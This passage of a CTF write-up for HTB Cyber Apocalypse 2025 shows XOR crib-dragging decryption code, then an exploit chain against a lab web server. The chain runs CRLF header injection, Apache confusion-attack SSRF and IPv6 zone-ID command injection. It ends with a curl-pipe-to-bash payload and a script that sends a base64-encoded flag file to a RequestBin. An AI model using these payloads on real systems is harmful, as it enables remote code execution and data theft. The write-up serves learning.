next few characters/words are, in any of these messages   XOR that (assumed) known-plaintext with the corresponding bytes on the cypher text   Use the result of the previous step to decrypt the next few bytes on all messages   Check that the results makes sense   Repeat from step 1, but now we have decrypted a few more bytes   (PS: this is a known-plaintext attack called “crib dragging”)   For example: looking at the first 3 messages, we know that’s the users joining the chat room. Since we know their usernames, we know that the longest of these 3 messages corresponds to !nick Runeblight. So we want the script to XOR \"!nick Runeblight\" with msgs[2], and use the result of that to decrypt len(\"!nick Runeblight\") bytes in all messages.   Here’s what I ended up with:   def xor(A, B):     return bytearray(a ^ b for a, b in zip(A, B))  msgs = [     \"a9810fdc6aac809930ad4152c7d5\",     \"a9810fdc6aac978230b24a51c8dcd7\",     \"a9810fdc6aac968331a5455fc0d5da21\",     # ...     \"a98303de77e9\",     \"a98303de77e9\",     \"a98303de77e9\", ]  C = bytes.fromhex(msgs[-1]) M = b\"!leave\" X = xor(M, C)  texts = [     (2, \"Runeblight\"),     (7, \"phrase\"),     (14, \"range \"),     (11, \"ch \"),     (12, \"th \"),     (16, \"ate \"),     (8, \"usted \"),     (15, \"annel \"),     (16, \"ight\"),     (11, \"ast\"),     (9, \"careful\"),     (6, \"vate \"),     (13, \" reach\"),     (16, \"gs\"),     (5, \"ve\"), ] for cypher_index, plain in texts:     C = bytes.fromhex(msgs[cypher_index])     C = C[len(X):]     M = plain.encode()     X += xor(M, C)  for i, msg in enumerate(msgs):     print(f\"decrypt[{i}]:\", xor(X, bytes.fromhex(msg)))   And thus we’re able to decrypt everything in the first channel, until we find the password for the secret chat room:   decrypt[0]: bytearray(b'!nick Doomfang') decrypt[1]: bytearray(b'!nick Stormbane') decrypt[2]: bytearray(b'!nick Runeblight') decrypt[3]: bytearray(b\"We\\'ve got a new tip about the rebels. Let\\'s keep our chat private.\") decrypt[4]: bytearray(b'Understood. Has there been any sign of them regrouping since our last move?') decrypt[5]: bytearray(b\"Not yet, but I\\'m checking some unusual signals. If they sense us, we might have\") decrypt[6]: bytearray(b\"This channel is not safe for long talks. Let\\'s switch to our private room.\") decrypt[7]: bytearray(b'Here is the passphrase for our secure channel: %mi2gvHHCV5f_kcb=Z4vULqoYJ&amp;oR') decrypt[8]: bytearray(b'Got it. Only share it with our most trusted allies.') decrypt[9]: bytearray(b'Yes. Our last move may have left traces. We must be very careful.') decrypt[10]: bytearray(b\"I\\'m checking our logs to be sure no trace of our actions remains.\") decrypt[11]: bytearray(b\"Keep me updated. If they catch on, we\\'ll have to act fast.\") decrypt[12]: bytearray(b\"I\\'ll compare the latest data with our backup plan. We must erase any sign we we\") decrypt[13]: bytearray(b'If everything is clear, we move to the next stage. Our goal is within reach.') decrypt[14]: bytearray(b\"Hold on. I\\'m seeing strange signals from outside. We might be watched.\") decrypt[15]: bytearray(b\"We can\\'t take any risks. Let\\'s leave this channel before they track us.\") decrypt[16]: bytearray(b'Agreed. Move all talks to the private room. Runeblight, please clear the logs h') decrypt[17]: bytearray(b\"Understood. I\\'m disconnecting now. If they have seen us, we must disappear imme\") decrypt[18]: bytearray(b'!leave') decrypt[19]: bytearray(b'!leave') decrypt[20]: bytearray(b'!leave')   Unfortunately, the secret channel is also encrypted in the same way, so we have to repeat the procedure:   # ...  print(\"------------------------------------------------------------\") msgs = [     # encrypted msgs from #secret channel ]  texts = [     (10, \" are\"),     (8, \"uncil\"),     (7, \"eady be\"),     (8, \"ies\"),     (12, \"in\"),     (3, \"hannel\"),     (5, \"work\"),     (4, \"gainst us\"),     (10, \"n of \"),     (11, \"ct soon\"),     (7, \"take could \"),     (5, \"to \"),     (7, \"m our \"),     (11, \"f opportunity closes.\"),     (8, \"ve a \"),     (4, \"s.\"),     (6, \"blem.\"), ] for cypher_index, plain in texts:     C = bytes.fromhex(msgs[cypher_index])     C = C[len(X):]     M = plain.encode()     X += xor(M, C)  for i, msg in enumerate(msgs):     print(f\"decrypt[{i}]:\", xor(X, bytes.fromhex(msg)))   After some more time iterating on this, we finally find the flag:    Web - Cyber Attack      Welcome, Brave Hero of Eldoria. You’ve entered a domain controlled by the forces of Malakar, the Dark Ruler of Eldoria. This is no place for the faint of heart. Proceed with caution: The systems here are heavily guarded, and one misstep could alert Malakar’s sentinels. But if you’re brave - or foolish - enough to exploit these defenses, you might just find a way to weaken his hold on this world. Choose your path carefully: Your actions here could bring hope to Eldoria… or doom us all. The shadows are watching. Make your move.    We’re now given an instance of a server running on a certain IP+port, along with the full source code needed to reproduce it on a local docker environment.   Web Recon   With some basic reconnaissance, we verify that the port is serving HTTP, and apparently using Apache 2.4.54 and PHP 7.4.33 to do so:    The HTLM itself is a simple web form which can submit domains or IPs to a “cyber attack server” (in this case, the “attack” consists of a ping -c 1 &lt;TARGET&gt;).    The IP-based attack is only enabled if we’re launching the attack from the server’s local network. Looking at the page source, we can see that some part of this validation is done client-side, and we can simply edit the HTML to enable the IP attack button. We still get a 403 Forbidden if we try to submit to that endpoint, so it’s being blocked server side as well.    Source Analysis   Looking at the source code now, we can see that it is indeed an Apache HTTP server, with one CGI script in PHP and other two implemented in Python. Every important piece of code is shown in the screenshot below:    Let’s point out a few things:     We know that the flag will be stored in /flag-&lt;random-string&gt;.txt   In the Apache config, we verify that the /cgi-bin/attack-ip endpoint is restricted and only accessible from localhost IPs   In both python CGI scripts, we see a system command being executed with a request-provided input interpolated as the target argument to ping; this should immediately jump out as an opportunity for RCE   Input validation in attack-domain is done with a regex, whereas in attack-ip it suffices that ip_address(target) not throw an exception   In both cases, the name parameter is not sanitized, and is put back in the Location header when target fails validation   Command Injection   The regex in attack-domain is quite restrictive and I dont’t see a way to exploit it for command injection. Fortunately, after looking at the source code for ipaddress.ip_address(), I found out that its IPv6 parsing can be quite permissive because it implements RFC 4007 “scoped addresses”. Here’s a few tests:    Essentially: any valid unscoped IPv6 address can have a suffix %&lt;ZONE&gt;, where &lt;ZONE&gt; can be any string, as long as it does not contain forward slashes. We now know that, if we ever manage to call the /cgi-bin/attack-ip endpoint, we can exploit this to achieve RCE.   CRLF and Header Injection   Looking back at attack-domain, I started playing with the name parameter and eventually found out that it could be used to inject arbitrary HTTP headers in the response if it contained sequences of CRLF bytes. In the screenshot below, I validate this by injecting X-Injected-Header and seeing it come back in the reply.    Confusion Attacks   At this point, I was stuck. I knew how to exploit attack-ip for RCE, but was denied access to it. In attack-domain, we had a header injection exploit working, but nothing else.   Fortunately, after some googling I eventually found Orange Tsai’s Black Hat 2024 presentation, as well as his blog post / writeup, on “Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!”. His research shows (among other things) that an attacker who can inject arbitrary headers in an Apache HTTP response can achieve generalized SSRF (Server-Side Request Forgery).    SSRF Attack   We copied the example from his slides and checked that SSRF was working (albeit only for HTTP targets). In the screenshot below, we can see that we’ve tricked the server into accessing http://example.com/ and serving that page in its response.    Using this exploit, we use the remote server to trigger /cgi-bin/attack-ip. Since the proxy is in the same machine, it gets right through the restriction configured for that endpoint.    RCE and Exfiltration   After messing around with url-encoding, we’re finally able to execute commands in the server, sending payloads such as ::1%$(whoami) or ::1%$(ls) in the target parameter of the /cgi-bin/attack-ip endpoint. Still, getting the flag required some level of trickyness, since we can’t execute any commands containing /. Furthermore, we also have no way to see the output of our commands.   My solution to this involved hosting a script in the index.html page of a custom domain I have. With that resource being served by default on HTTP requests to /, and this empty path being an optional part of an URL, my final payload was ::1%$(curl+tmp.baioc.dev|bash). (NB: in Apache/PHP, the + character gets url-decoded to a space character).   Meanwhile, here’s what I hosted in tmp.baioc.dev/index.html:  #!/bin/bash curl \"http://requestbin.whapi.cloud/v5c55ev5?flag=$(cat /flag* | base64)\"   This is reading the flag, base64-encoding it and exfiltrating the result via a request parameter to a temporary RequestBin. The screenshot below shows the fully encoded curl command used to trigger the remote script.    And then, looking at the logs for that RequestBin, we see the base64-encoded flag arriving:    ","categories": ["writeup"],
        "tags": ["cybersecurity","ctf"],
        "url": "/writeup/htb-cyber-apocalypse-2025/",
        "teaser": "/assets/images/htb-cyber-apocalypse-2025/cave-expedition-decrypt.png"
      }]
